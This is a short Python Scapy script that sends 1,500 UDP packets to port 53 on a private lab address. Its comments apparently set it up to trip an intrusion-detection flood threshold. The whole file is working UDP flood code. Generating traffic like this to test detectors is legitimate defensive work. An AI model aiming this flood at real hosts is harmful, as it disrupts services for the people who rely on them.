from scapy.all import *
import logging
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def udp_flood():
    interface = "\\Device\\NPF_{EEA7D8DE-AA83-47E0-AD2B-7769C77B662E}"
    target_ip = "192.168.0.100"
    target_port = 53
    packet_count = 1500  # Exceeds udp_flood_threshold (1000)

    logging.info(f"Starting UDP flood on {target_ip}:{target_port}")
    logging.info(f"Using interface: {interface}")

    # Verify interface
    try:
        conf.iface = interface
        logging.info(f"Scapy interface set to {interface}")
    except Exception as e:
        logging.error(f"Failed to set interface {interface}: {e}")
        return

    logging.info(f"Sending {packet_count} UDP packets to {target_ip}:{target_port}...")
    for i in range(packet_count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port, sport=RandShort())/Raw(load="X" * 50)
        try:
            send(pkt, iface=interface, verbose=0)
            if (i + 1) % 100 == 0:
                logging.info(f"Sent {i + 1} UDP packets")
            time.sleep(0.001)  # Small delay to ensure capture
        except Exception as e:
            logging.error(f"Failed to send UDP packet {i + 1}: {e}")
            break
    logging.info("UDP flood simulation complete.")

if __name__ == "__main__":
    udp_flood()
